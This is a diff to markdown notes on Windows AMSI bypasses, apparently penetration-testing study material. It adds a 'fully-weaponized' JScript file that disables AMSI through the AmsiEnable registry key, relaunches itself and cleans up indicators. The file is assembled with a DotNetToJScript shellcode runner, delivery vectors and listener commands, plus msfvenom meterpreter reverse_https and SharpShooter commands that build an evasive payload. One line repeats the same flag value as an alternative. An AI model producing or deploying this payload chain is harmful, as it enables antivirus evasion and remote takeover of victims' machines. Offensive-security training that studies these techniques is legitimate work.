@@ -105,9 +105,52 @@ try{
 > [!Note]
 > Prepend it to the DotNetToJscript-generated shellcode runner
 
+<!-- TODO(done 2026-09-24): documented (1) the full weaponized bypass+runner assembly order and (2) the SharpShooter one-liner with --amsi. Original markers kept for traceability. -->
 TODO: Combine the AMSI bypass with the shellcode runner, writing fully-weaponized client-side code execution with Jscript.
 
 TODO:Experiment with SharpShooter to generate the same type of payload with an AMSI bypass.
+
+> [!Note] Weaponizing: AMSI bypass + shellcode runner in one `.js`
+> The order matters — the registry (or tampering) AMSI bypass must sit **at the very top** so it fires (or re-launches the script under a disabled-AMSI context) *before* the .NET runtime parses the DotNetToJScript payload. The assembled file looks like:
+> ```javascript
+> // ── 1. AMSI bypass block (from "Bypass AMSI via Registry Keys" above) ──
+> var sh = new ActiveXObject('WScript.Shell');
+> var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
+> try {
+>     var AmsiEnable = sh.RegRead(key);
+>     if (AmsiEnable != 0) { throw new Error(1, ''); }
+> } catch(e) {
+>     sh.RegWrite(key, 0, "REG_DWORD");
+>     sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} " + WScript.ScriptFullName, 0, 1);
+>     sh.RegWrite(key, 1, "REG_DWORD");   // restore so we don't leave an obvious IOC
+>     WScript.Quit(1);
+> }
+>
+> // ── 2. DotNetToJScript shellcode runner ──
+> // Generated on Kali/Windows from a C# runner (VirtualAlloc + CreateThread, or
+> // process injection from [[Process Injection and Migration]]):
+> //   DotNetToJScript.exe runner.exe -l JScript -v v4 -o runner.js
+> // Paste the generated serialized-object block here; on execution the .NET
+> // runtime is now loaded in a process where AmsiEnable=0, so the managed
+> // assembly and its shellcode are never scanned.
+> <SERIALIZED .NET STAGER FROM DotNetToJScript>
+> ```
+> Deliver it with `wscript runner.js` (or `mshta`/an `.hta`) — see [[Client-Side Attacks]] and [[Bypassing AppLocker with JScript]] for delivery vectors. Start the matching listener first (`nc -lvnp 4444` / Metasploit multi/handler).
+>
+> > [!Warning]
+> > The `cscript` re-launch means the file executes **twice**: once to write `AmsiEnable=0` and quit, once (freshly, AMSI-disabled) to run the stager. Test that `WScript.ScriptFullName` resolves correctly when delivered from your actual vector (a UNC path or temp folder behaves differently than a local run).
+>
+> > [!Note] SharpShooter equivalent
+> > SharpShooter automates exactly this: it wraps your raw shellcode in a stager, applies a chosen AMSI bypass, and emits the JScript/HTA/VBS. The relevant flag is `--amsi amsienable` (the registry technique documented above) — other values include `--amsi amsienable`/custom providers depending on the build:
+> > ```bash
+> > # Generate raw x64 shellcode
+> > $ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=443 -f raw -o sc.raw
+> >
+> > # Stageless JScript with the AmsiEnable registry bypass baked in
+> > $ python2 SharpShooter.py --stageless --dotnetver 4 --payload js \
+> >     --output payload --rawscfile sc.raw --amsi amsienable --sandbox 1
+> > ```
+> > This produces `payload.js` equivalent to the hand-assembled file above. Prefer SharpShooter's `--sandbox` checks and its built-in stager over a hand-rolled runner for reliability; keep the manual version to understand what it is doing under the hood.
 
 ---
 # Bypass AMSI via Tampering
